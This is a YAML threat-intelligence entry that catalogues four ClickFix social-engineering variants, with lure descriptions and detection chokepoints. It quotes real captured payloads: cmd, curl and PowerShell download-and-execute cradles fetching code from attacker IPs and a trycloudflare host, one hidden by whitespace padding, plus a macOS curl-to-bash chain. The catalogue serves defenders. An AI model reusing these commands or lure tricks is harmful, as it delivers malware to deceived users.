Name: ClickFix Techniques
Id: c7f2a1b4-3e8d-4a9c-8b5f-2d1e6f0a7c3b
MitreIds:
- T1204.004
Tactics:
- Initial Access
Techniques:
- 'User Execution: Malicious Copy and Paste'
DetectionPriority: HIGH
ThreatPrevalence: HIGH
DetectionDifficulty: LOW
Description: 'User pastes a malicious command from their clipboard into a Run dialog, terminal, or Explorer
  address bar. The lure page writes to the clipboard via JavaScript and the user does the rest. No attachment,
  no exploit, no macro. The clipboard is the delivery mechanism and the scripting interpreter spawn is the
  chokepoint. 9 variants tracked, from fake CAPTCHAs to cloned install pages to DNS-based payload retrieval.
  APT28, MuddyWater, and Kimsuky adopted ClickFix for espionage in late 2024.

  '
LastUpdated: '2026-03-10'
Author: '@iimp0ster'
Variations:
- Name: ClickFix
  FirstSeen: 2024-Q1
  Status: Active
  SourceURL: https://huntress.com/blog/dont-sweat-clickfix-techniques
  NotesShort: Original variant; fake CAPTCHA or browser-fix prompts user to paste command into Run dialog
  Notes: Original variant; first documented by Proofpoint in March 2024 via TA571; fake CAPTCHA or browser fix prompts user
    to paste command into Run dialog or terminal
  VariantId: clickfix
  LurePreview: /assets/lures/clickfix-original.html
  Lure: 'Fake Cloudflare CAPTCHA or reCAPTCHA page. User clicks "I''m not a robot" checkbox, then page displays
    "Verification Steps" instructing: 1. Press Win+R 2. Press Ctrl+V 3. Press Enter. The clipboard is silently loaded
    with the payload before the user sees the instructions. Each visit shows the user''s actual domain and a random
    Cloudflare Ray ID to reinforce legitimacy.'
  LureTags:
  - Cloudflare impersonation
  - '"I''m not a robot"'
  - Win+R instruction
  - Fake Ray ID
  Payloads:
  - Platform: Windows
    Command: 'conhost.exe --headless cmd /c cd /D %userprofile% && curl -s -o a.exe hxxp[://]213.209.150[.]188:8112/a.exe
      && conhost.exe --headless a.exe && REM By pressing the enter button you confirm you are not a bot'
    Note: 'Uses conhost.exe --headless to run cmd.exe without a visible console window. curl downloads the payload to
      %userprofile%\a.exe from a hardcoded IP over HTTP port 8112, then a second headless conhost.exe executes the dropped
      binary. The trailing REM comment disguises the command as a CAPTCHA confirmation in the Run dialog. No PowerShell
      involved. Pure cmd.exe + curl chain. Sourced from Huntress ClickFix analysis.'
  ChokepointMapping: 'clipboard write → conhost.exe --headless → cmd.exe → curl.exe (outbound HTTP) → conhost.exe --headless → a.exe'
- Name: FileFix
  FirstSeen: 2025-Q2
  Status: Active
  SourceURL: https://huntress.com/blog/dont-sweat-clickfix-techniques
  NotesShort: Shifts attack surface to Windows File Explorer address bar; whitespace padding hides payload after visible "Captcha Verify" text
  Notes: Shifts attack surface from Run dialog to Windows File Explorer address bar; uses whitespace padding to hide the actual
    PowerShell command after a visible CAPTCHA label; Trycloudflare tunnel used for payload hosting; documented by Huntress
  VariantId: filefix
  LurePreview: /assets/lures/filefix.html
  Lure: 'Same CAPTCHA/verification pretext as ClickFix, but with a file upload button (<input type="file">) that opens the
    Windows File Explorer. User is instructed to paste into the File Explorer address bar instead of the Run dialog.'
  LureTags:
  - File Explorer address bar
  - '<input type="file"> button'
  - Whitespace padding
  - Trycloudflare tunnel
  Payloads:
  - Platform: Windows
    Command: 'powershell.exe irm blake-wright-andorra-learners.trycloudflare[.]com/rhugei.jpg | iex #                                                                                                                                                                                                                      Capcha Verify'
    Note: 'Pasted into the File Explorer address bar. The visible portion in the address bar shows only "Capcha Verify"
      (intentional typo) after massive whitespace padding. The actual PowerShell command is scrolled off to the left.
      irm (Invoke-RestMethod) fetches a .jpg-disguised PowerShell script from a Trycloudflare tunnel, piped to iex
      (Invoke-Expression) for immediate execution. Trycloudflare tunnels provide free, disposable infrastructure that
      rotates on each deployment. Sourced from Huntress ClickFix analysis.'
  ChokepointMapping: 'clipboard write → powershell.exe (parent: explorer.exe via address bar) → outbound HTTP to Trycloudflare tunnel'
- Name: TerminalFix
  FirstSeen: 2024-Q4
  Status: Active
  SourceURL: https://huntress.com/blog/dont-sweat-clickfix-techniques
  NotesShort: Dual-OS variant; lure JS uses navigator.platform to serve Windows PowerShell or macOS bash payload via atob-decoded clipboard write
  Notes: 'Mimics terminal windows; lure page uses navigator.platform OS detection to serve platform-specific payloads via
    JavaScript atob() decoding into the clipboard. Windows users get a PowerShell download cradle, macOS users get a curl-to-bash
    chain. Same hardcoded C2 IP, same campaign, two execution paths. Demonstrates how a single lure page covers both enterprise
    and developer endpoints. Documented by Huntress.'
  VariantId: terminalfix
  LurePreview: /assets/lures/terminalfix.html
  Lure: 'Mimics a terminal/console window UI. Lure JavaScript detects OS via navigator.platform and writes a platform-specific
    payload to the clipboard using atob() decoding. Windows users are instructed to open PowerShell, macOS users to open Terminal.
    Single lure page, dual payloads. One campaign covers both OS targets.'
  LureTags:
  - Terminal UI impersonation
  - '"Open PowerShell"'
  - OS detection via navigator.platform
  - Dual payloads via atob()
  - Single C2 IP
  Payloads:
  - Platform: Windows
    Command: 'iwr -useb hxxp[://]93.185.166[.]113/troubleshoot.ps1 | iex'
    Note: 'Served via atob() decoding in lure JS when navigator.platform matches Windows. iwr -useb (Invoke-WebRequest
      -UseBasicParsing) fetches a PowerShell script from a hardcoded IP over HTTP, piped to iex for immediate execution.
      Same C2 IP as the macOS payload. Single infrastructure, dual OS targeting. Sourced from Huntress ClickFix analysis.'
  - Platform: macOS
    Command: 'curl -o troubleshot.sh hxxp[://]93.185.166[.]113/troubleshot.sh && chmod +x troubleshot.sh && bash troubleshot.sh'
    Note: 'Served via atob() decoding when navigator.platform matches macOS. Downloads troubleshot.sh (note typo in filename -
      "troubleshot" not "troubleshoot"), sets executable permission, and runs via bash. Three-step chain instead of piped
      execution. The file touches disk before running, unlike the Windows variant. Same C2 IP. Sourced from Huntress
      ClickFix analysis.'
  ChokepointMapping: 'lure JS atob() → clipboard write (OS-specific) → powershell.exe or bash → outbound HTTP to 93.185.166[.]113'
- Name: DownloadFix
  FirstSeen: 2024-Q4
  Status: Active
  SourceURL: https://github.com/jfmaes/downloadfix
  NotesShort: Fake "Download Interrupted" page auto-downloads repairtool.cmd, user clicks to execute
  Notes: 'PoC by jfmaes (redteamer.tips). Different from other ClickFix variants: no clipboard paste,
    no Win+R. Page auto-generates a .cmd file via JavaScript Blob after 10 seconds, triggers a browser
    download, then instructs user to open downloads (Ctrl+J) and click repairtool.cmd. The .cmd file
    contains the payload. User clicks a file in their downloads, not a paste-and-execute flow.'
  VariantId: downloadfix
  LurePreview: /assets/lures/downloadfix.html
  Lure: 'Fake "Download Interrupted!" error. JavaScript creates a .cmd file as a Blob after 10 seconds
    and triggers an automatic browser download. Page instructs user to press Ctrl+J (Chrome downloads)
    and click repairtool.cmd to "restore the document." No clipboard involved. The payload is a
    downloaded file the user executes from their browser downloads bar.'
  LureTags:
  - '"Download Interrupted"'
  - repairtool.cmd auto-download
  - JavaScript Blob file generation
  - No clipboard paste
  Payloads:
  - Platform: Windows
    Command: "@echo off\ncalc.exe\nexit\n\n# PoC payload. Real attacks replace calc.exe with download cradle or reverse shell"
    Note: 'The .cmd file is generated client-side via JavaScript Blob, not fetched from a server. Page
      creates the file content in JS, converts to Blob, triggers download via dynamically created <a>
      element. The PoC drops calc.exe. Real deployments would contain a PowerShell download cradle or
      direct payload.'
  ChokepointMapping: 'JS Blob generates .cmd → browser auto-downloads file → user clicks repairtool.cmd → cmd.exe executes payload'
